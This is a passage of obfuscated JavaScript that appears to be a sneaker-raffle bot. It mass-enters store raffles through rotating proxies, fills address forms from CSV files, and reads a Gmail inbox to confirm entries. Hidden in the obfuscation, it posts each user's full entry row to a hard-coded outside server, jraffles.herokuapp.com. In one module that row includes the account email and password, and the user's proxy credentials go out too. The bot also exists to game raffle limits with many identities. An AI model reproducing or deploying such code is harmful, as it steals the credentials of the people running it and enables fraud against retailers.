                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2f1cfe[_0x3a44cd]['Email'] == '' || _0x2f1cfe[_0x3a44cd]['Password'] == '' || _0x2f1cfe[_0x3a44cd]['FirstName'] == '' || _0x2f1cfe[_0x3a44cd]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x1830eb = _0xf69c7e[_0x3a44cd]['split'](':');
                        else
                            var _0x5f4469 = Math['round'](Math['random']() * (_0xf69c7e['length'] - 0x1)), _0x1830eb = _0xf69c7e[_0x5f4469]['split'](':');
                        var _0x594bdf;
                        try {
                            _0x594bdf = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1830eb[0x0] + ':' + _0x1830eb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x594bdf = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1830eb[0x0] + ':' + _0x1830eb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3cbca0 = await _0x594bdf['newPage']();
                            await _0x3cbca0['authenticate']({
                                'username': '' + _0x1830eb[0x2],
                                'password': '' + _0x1830eb[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3cbca0['setRequestInterception'](!![]), _0x3cbca0['on']('request', _0x5772e9 => {
                                _0x5772e9['resourceType']() === 'image' || _0x5772e9['resourceType']() === 'font' || _0x5772e9['resourceType']() === 'media' ? _0x5772e9['abort']() : _0x5772e9['continue']();
                            }), await _0x3cbca0['goto']('' + _0x2f1cfe[_0x3a44cd]['Url'], { 'waitUntil': 'networkidle2' }), await _0x101cd5(0x12c), await _0x3cbca0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3cbca0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x101cd5(0x7d0);
                            try {
                                await _0x3cbca0['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x3cbca0['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Logging\x20in'), await _0x3cbca0['waitForSelector']('#username'), await _0x3cbca0['type']('#username', _0x2f1cfe[_0x3a44cd]['Email']), await _0x3cbca0['waitForSelector']('#password'), await _0x3cbca0['type']('#password', _0x2f1cfe[_0x3a44cd]['Password']), await _0x101cd5(0x190), await _0x3cbca0['click']('#buttonSubmit'), await _0x3cbca0['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Getting\x20Product'), await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2f1cfe[_0x3a44cd]['Size']);
                            let _0x3be9af = _0x2f1cfe[_0x3a44cd]['Size']['replace']('.5', '\x201/2');
                            if (_0x3be9af['toUpperCase']() == 'RANDOM') {
                                const _0x581308 = await _0x3cbca0['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x560bcf = Math['round'](Math['random']() * (_0x581308['length'] - 0x1));
                                await _0x581308[_0x560bcf]['click']();
                            } else
                                await _0x3cbca0['click']('button[aria-label=\x22' + _0x3be9af + '\x22]');
                            await _0x101cd5(0x1f4);
                            try {
                                await _0x3cbca0['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x101cd5(0x12c), console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3cbca0['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_firstName', _0x2f1cfe[_0x3a44cd]['FirstName']), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_lastName', _0x2f1cfe[_0x3a44cd]['LastName']), await _0x101cd5(0x12c), await _0x3cbca0['select']('#dwfrm_raffle_addressFields_country', _0x2f1cfe[_0x3a44cd]['Country']), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_city', _0x2f1cfe[_0x3a44cd]['City']), await _0x101cd5(0x12c);
                            _0x2f1cfe[_0x3a44cd]['Postcode'] == undefined && (_0x2f1cfe[_0x3a44cd]['Postcode'] = _0x2f1cfe[_0x3a44cd]['Zip']);
                            await _0x3cbca0['type']('#dwfrm_raffle_addressFields_postalCode', _0x2f1cfe[_0x3a44cd]['Postcode']), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_address1', _0x2f1cfe[_0x3a44cd]['Address1']), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_address2', _0x2f1cfe[_0x3a44cd]['HouseNumber']), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x2f1cfe[_0x3a44cd]['Address2']), await _0x101cd5(0x12c), await _0x3cbca0['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x101cd5(0x12c), await _0x3cbca0['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x2f1cfe[_0x3a44cd]['Follower']), await _0x101cd5(0x1f4), await _0x3cbca0['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20' + _0x1ee8dd['blue']('Awaiting\x20Paypal\x20Payment')), await _0x3cbca0['click']('.b-paypal_button');
                            try {
                                await _0x3cbca0['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x46b19d = 'no', _0x30fd17(_0x2f1cfe[_0x3a44cd], _0x241600), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x11ee85['succesDEVMSG']);
                                await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x11ee85['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x11ee85['succesPUBMSG']);
                                let _0x490478 = _0x2f1cfe[_0x3a44cd];
                                try {
                                    prxdata = {
                                        'username': _0x5b6a98['replace']('#', ''),
                                        'module': _0x241600['name'],
                                        'entrydata': JSON['stringify'](_0x490478),
                                        'proxy': '' + _0xf69c7e[_0x3a44cd]
                                    };
                                    var _0x28444e = JSON['stringify'](prxdata);
                                    let _0x470e76 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x28444e, _0x470e76);
                                } catch (_0x5ddb8f) {
                                }
                            } catch (_0x4acd70) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4acd70)), _0x52b5be = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4acd70;
                                var _0x59426f = await _0x42c912(_0x2f1cfe[_0x3a44cd], _0x241600, 'dev', !![], _0x52b5be);
                                _0x11ee85['errorDEV'] = { 'embeds': [_0x59426f] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x11ee85['errorDEV']), await _0x3b1b09(_0x57f30c, _0x11ee85['errorDEV']);
                            }
                        } catch (_0x5ee96f) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20' + _0x5ee96f)), _0x52b5be = '' + _0x5ee96f;
                            var _0x59426f = await _0x42c912(_0x2f1cfe[_0x3a44cd], _0x241600, 'dev', !![], _0x52b5be);
                            _0x11ee85['errorDEV'] = { 'embeds': [_0x59426f] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x11ee85['errorDEV']), await _0x3b1b09(_0x57f30c, _0x11ee85['errorDEV']), _0x46b19d = 'yes';
                        } finally {
                            _0x594bdf && _0x594bdf['close']();
                            if (_0x46b19d == 'yes' && _0x1461ce != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x241600['name'] + ']\x20Task\x20' + (_0x3a44cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x1461ce + '\x20/\x205)')), _0x3a44cd = _0x3a44cd - 0x1, _0x1461ce = _0x1461ce + 0x1;
                                continue;
                            }
                            _0x46b19d == 'yes' && _0x1461ce >= 0x5 && (_0x3802e1(_0x2f1cfe[_0x3a44cd], _0x241600), _0x46b19d = 'no', _0x1461ce = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['AfewDelay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RLhP3P',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TRdHMm',
                                '$consent_form_version': 0x899638,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x9a4d40, _0x244f0e, _0x7c7810) {
                    for (var _0x495f02 = 0x0; _0x495f02 < _0x244f0e['length']; _0x495f02++) {
                        try {
                            await _0x15925d(_0x244f0e, _0x495f02);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x2bbb2c(_0xfe152a, _0x5bd366, _0x2e077a, _0x5d4cad, _0x279d9b) {
                            var _0x5051b1, _0x5b183e = {}, _0x5a870e = [], _0xfdab63 = {}, _0x10a122 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x40c65d = Math['round'](Math['random']() * (_0x10a122['length'] - 0x1));
                            !_0x5d4cad && (_0x5d4cad = {});
                            if (_0x5bd366 != 'ver') {
                                _0x18a4ea(_0x2e077a['name'] + '\x20Task\x20' + (_0xfe152a + 0x1) + '\x20/\x20' + _0x5d4cad['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85), await _0x15925d(_0x5d4cad, _0xfe152a), _0x5b183e = _0x2e077a['data'], _0x5b183e['data']['attributes']['email'] = '' + _0x5d4cad[_0xfe152a]['Email'];
                                if (_0x5d4cad[_0xfe152a]['Size'] == 'RANDOM') {
                                }
                                _0x5b183e['data']['attributes']['properties']['$first_name'] = '' + _0x5d4cad[_0xfe152a]['FirstName'], _0x5b183e['data']['attributes']['properties']['$last_name'] = '' + _0x5d4cad[_0xfe152a]['LastName'], _0x5b183e['data']['attributes']['properties']['$address1'] = _0x5d4cad[_0xfe152a]['Address1'] + '\x20' + _0x5d4cad[_0xfe152a]['Address2'] + '\x20' + _0x5d4cad[_0xfe152a]['HouseNumber'], _0x5b183e['data']['attributes']['properties']['$zip'] = '' + _0x5d4cad[_0xfe152a]['Zip'], _0x5b183e['data']['attributes']['properties']['$city'] = '' + _0x5d4cad[_0xfe152a]['City'], _0x5b183e['data']['attributes']['properties']['$country'] = '' + _0x5d4cad[_0xfe152a]['Country'], _0x5d4cad[_0xfe152a]['Size'] == 'RANDOM' ? _0x5b183e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x10a122[_0x40c65d] : _0x5b183e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5d4cad[_0xfe152a]['Size'], _0x5b183e['data']['attributes']['properties']['$phone_number'] = '' + _0x5d4cad[_0xfe152a]['Phone'], _0x5b183e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5d4cad[_0xfe152a]['Follower'];
                            }
                            if (_0x5b5c1b['useRandomProxy'] = ![])
                                var _0x338971 = _0x279d9b[_0xfe152a]['split'](':');
                            else
                                var _0x3fe224 = Math['round'](Math['random']() * (_0x279d9b['length'] - 0x1)), _0x338971 = _0x279d9b[_0x3fe224]['split'](':');
                            var _0x522fff = {
                                'jar': _0x160c4b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2e077a['url'],
                                'headers': _0x2e077a['headers'],
                                'body': JSON['stringify'](_0x5b183e),
                                'proxy': 'http://' + _0x338971[0x2] + ':' + _0x338971[0x3] + '@' + _0x338971[0x0] + ':' + _0x338971[0x1]
                            };
                            return _0x5bd366 != 'ver' && (_0x522fff['url'] = _0x2e077a['url'], _0x522fff['headers'] = _0x2e077a['headers']), _0x5bd366 == 'ver' && (_0x522fff['method'] = 'GET'), new Promise(function (_0x2e956f, _0x5449e7) {
                                callback = async (_0x7d8714, _0x32faf9, _0x53ee9f) => {
                                    if (!_0x7d8714 && _0x32faf9['statusCode'] == 0xca || !_0x7d8714 && _0x32faf9['statusCode'] == 0xc8) {
                                        if (_0x5bd366 != 'ver') {
                                            var _0x485acf = await _0x42c912(_0x5d4cad[_0xfe152a], _0x2e077a, 'dev', ![]), _0xd30aee = await _0x42c912(_0x5d4cad[_0xfe152a], _0x2e077a, 'pub', ![]);
                                            const _0x1119fa = {
                                                'succesDEVMSG': { 'embeds': [_0x485acf] },
                                                'succesPUBMSG': { 'embeds': [_0xd30aee] }
                                            };
                                            let _0x4c5980 = _0x5d4cad[_0xfe152a];
                                            try {
                                                prxdata = {
                                                    'username': _0x5b6a98['replace']('#', ''),
                                                    'module': _0x2e077a['name'],
                                                    'entrydata': JSON['stringify'](_0x4c5980),
                                                    'proxy': '' + _0x279d9b[_0xfe152a]
                                                };
                                                var _0x248551 = JSON['stringify'](prxdata);
                                                let _0xaae1a = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x248551, _0xaae1a);
                                            } catch (_0x124763) {
                                            }
                                            if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                                try {
                                                    await _0x3b1b09(_0x5b5c1b['webhook'], _0x1119fa['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x1119fa['succesDEVMSG']), await _0x101cd5(0xc8);
                                            try {
                                                await _0x3b1b09(_0x155517, _0x1119fa['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x30fd17(_0x5d4cad[_0xfe152a], _0x2e077a);
                                        }
                                        _0x2e956f(console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x2e077a['name'] + ']\x20Task\x20' + (_0xfe152a + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x5bd366 != 'ver') {
                                            var _0x166654 = '' + _0x7d8714, _0x3b2e1b = await _0x42c912(_0x5d4cad[_0xfe152a], _0x2e077a, 'dev', !![], _0x166654), _0x47fa45 = {};
                                            _0x47fa45['errorDEV'] = { 'embeds': [_0x3b2e1b] }, _0x3802e1(_0x5d4cad[_0xfe152a], _0x2e077a), _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x47fa45['errorDEV']), await _0x3b1b09(_0x57f30c, _0x47fa45['errorDEV']);
                                        }
                                        _0x5449e7(console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2e077a['name'] + ']\x20Task\x20' + (_0xfe152a + 0x1) + ':\x20' + _0x7d8714)));
                                    }
                                };
                                try {
                                    _0x5bd366 != 'ver' && console['log'](_0x235b96() + '\x20[' + _0x2e077a['name'] + ']\x20Task\x20' + (_0xfe152a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5b183e['data']['attributes']['email']), _0x29b460(_0x522fff, callback);
                                } catch (_0x25bd5a) {
                                    console['log'](_0x235b96() + '\x20Task\x20' + (_0xfe152a + 0x1) + ':\x20' + _0x25bd5a);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2bbb2c(_0x495f02, 'nor', _0x9a4d40, _0x244f0e, _0x7c7810), console['log'](_0x235b96() + '\x20[' + _0x9a4d40['name'] + ']\x20Sleeping\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        } catch (_0x4053b4) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x7cba3a, _0x3e4b16, _0x2632c8) {
                    var _0x28949a = [], _0x38a060 = ![];
                    async function _0x539858() {
                        var _0x5b77da = new _0x3a8843({
                            'user': _0x5b5c1b['masterMail'],
                            'password': _0x5b5c1b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x42d27b(_0xccf15) {
                            _0x5b77da['openBox']('INBOX', ![], _0xccf15);
                        }
                        _0x5b77da['once']('ready', function () {
                            _0x42d27b(function (_0x269f96, _0x2c5ab1) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x269f96)
                                    throw _0x269f96;
                                _0x5b77da['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x5a139b, _0x20ec5e) {
                                    if (!_0x20ec5e || !_0x20ec5e['length'])
                                        console['log'](_0x235b96() + '\x20[' + _0x7cba3a['name'] + ']\x20No\x20mails\x20found'), _0x5b77da['end']();
                                    else {
                                        var _0x20aaa5 = _0x5b77da['seq']['fetch'](_0x20ec5e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x20aaa5['on']('message', function (_0x480946, _0x440681) {
                                            var _0x395cb9 = '(#' + _0x440681 + ')\x20';
                                            _0x480946['on']('body', function (_0x4db44e, _0x28f35a) {
                                                _0xbb5a33(_0x4db44e, (_0x54c687, _0x202535) => {
                                                    var _0x39db2a = _0x202535['text']['split']('(')[0x1], _0x1d2419 = _0x39db2a['split'](')')[0x0];
                                                    _0x28949a['push'](_0x1d2419);
                                                });
                                            }), _0x480946['once']('end', function () {
                                            });
                                        }), _0x20aaa5['once']('error', function (_0x43cc38) {
                                            console['log']('Fetch\x20error:\x20' + _0x43cc38), _0x38a060 = !![];
                                        }), _0x20aaa5['once']('end', function () {
                                            _0x5b77da['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5b77da['once']('error', function (_0x437105) {
                            console['log'](_0x1ee8dd['red'](_0x437105['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x38a060 = !![];
                        }), _0x5b77da['once']('end', async function () {
                            _0x38a060 = !![];
                        }), _0x5b77da['connect']();
                    }
                    async function _0x290b6f(_0xc4e3bb, _0x582303, _0x3baf83) {
                        for (var _0x4841b7 = 0x0; _0x4841b7 < _0x582303['length']; _0x4841b7++) {
                            async function _0xb2e91(_0x1a4a31, _0x20df13, _0x2f313e, _0x2510f3, _0xc40c1c) {
                                var _0x4ad017, _0x49c70b = {}, _0x3374ad = [], _0x2ff8a4 = {}, _0x45ba5f = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5ccca0 = Math['round'](Math['random']() * (_0x45ba5f['length'] - 0x1));
                                _0x2510f3[_0x1a4a31]['Size'] == 'RANDOM' && (_0x2510f3[_0x1a4a31]['Size'] = _0x45ba5f[_0x5ccca0]);
                                !_0x2510f3 && (_0x2510f3 = {});
                                if (_0x5b5c1b['useRandomProxy'] = ![])
                                    var _0x257838 = _0xc40c1c[_0x1a4a31]['split'](':');
                                else
                                    var _0x548f32 = Math['round'](Math['random']() * (_0xc40c1c['length'] - 0x1)), _0x257838 = _0xc40c1c[_0x548f32]['split'](':');
                                var _0x5c618d = {
                                    'jar': _0x160c4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2f313e['url'],
                                    'headers': _0x2f313e['headers'],
                                    'body': JSON['stringify'](_0x49c70b),
                                    'proxy': 'http://' + _0x257838[0x2] + ':' + _0x257838[0x3] + '@' + _0x257838[0x0] + ':' + _0x257838[0x1]
                                };
                                return _0x20df13 != 'ver' && (_0x5c618d['url'] = _0x2f313e['url'], _0x5c618d['headers'] = _0x2f313e['headers']), _0x20df13 == 'ver' && (_0x5c618d['method'] = 'GET', _0x5c618d['url'] = _0x2510f3[_0x1a4a31]), new Promise(function (_0x289857, _0x110f70) {
                                    callback = async (_0x51647a, _0x3f191d, _0x1908b9) => {
                                        if (!_0x51647a && _0x3f191d['statusCode'] == 0xca || !_0x51647a && _0x3f191d['statusCode'] == 0xc8) {
                                            if (_0x20df13 != 'ver') {
                                                var _0xfba936 = await _0x42c912(_0x2510f3[_0x1a4a31], _0x2f313e, 'dev', ![]), _0x5eeb2a = await _0x42c912(_0x2510f3[_0x1a4a31], _0x2f313e, 'pub', ![]);
                                                const _0x2c6745 = {
                                                    'succesDEVMSG': { 'embeds': [_0xfba936] },
                                                    'succesPUBMSG': { 'embeds': [_0x5eeb2a] }
                                                };
                                                if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                                    try {
                                                        await _0x3b1b09(_0x5b5c1b['webhook'], _0x2c6745['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x2c6745['succesDEVMSG']), await _0x101cd5(0xc8);
                                                try {
                                                    await _0x3b1b09(_0x155517, _0x2c6745['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x30fd17(_0x2510f3[_0x1a4a31], _0x2f313e);
                                            }
                                            _0x289857(console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x2f313e['name'] + ']\x20Task\x20' + (_0x1a4a31 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x20df13 != 'ver') {
                                                var _0x5a7166 = '' + _0x51647a, _0x5add2b = await _0x42c912(_0x2510f3[_0x1a4a31], _0x2f313e, 'dev', !![], _0x5a7166), _0x457626 = {};
                                                _0x457626['errorDEV'] = { 'embeds': [_0x5add2b] }, _0x3802e1(_0x2510f3[_0x1a4a31], _0x2f313e), _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x457626['errorDEV']), await _0x3b1b09(_0x57f30c, _0x457626['errorDEV']);
                                            }
                                            _0x110f70(console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2f313e['name'] + ']\x20Task\x20' + (_0x1a4a31 + 0x1) + ':\x20' + _0x51647a)));
                                        }
                                    };
                                    try {
                                        _0x20df13 != 'ver' ? console['log'](_0x235b96() + '\x20[' + _0x2f313e['name'] + ']\x20Task\x20' + (_0x1a4a31 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x49c70b['data']['attributes']['email']) : console['log'](_0x235b96() + '\x20[' + _0x2f313e['name'] + ']\x20Task\x20' + (_0x1a4a31 + 0x1) + ':\x20Fetching\x20Response'), _0x29b460(_0x5c618d, callback);
                                    } catch (_0x4dda78) {
                                        console['log'](_0x235b96() + '\x20Task\x20' + (_0x1a4a31 + 0x1) + ':\x20' + _0x4dda78);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xb2e91(_0x4841b7, 'ver', _0xc4e3bb, _0x582303, _0x3baf83), console['log'](_0x235b96() + '\x20[' + _0xc4e3bb['name'] + ']\x20Sleeping\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                            } catch (_0xdd2f18) {
                            }
                        }
                    }
                    try {
                        _0x539858();
                        while (!_0x38a060) {
                            await _0x101cd5(0xbb8);
                        }
                        console['log']('Found\x20' + _0x28949a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x101cd5(0x9c4);
                    }
                    await _0x290b6f(_0x7cba3a, _0x28949a, _0x2632c8);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
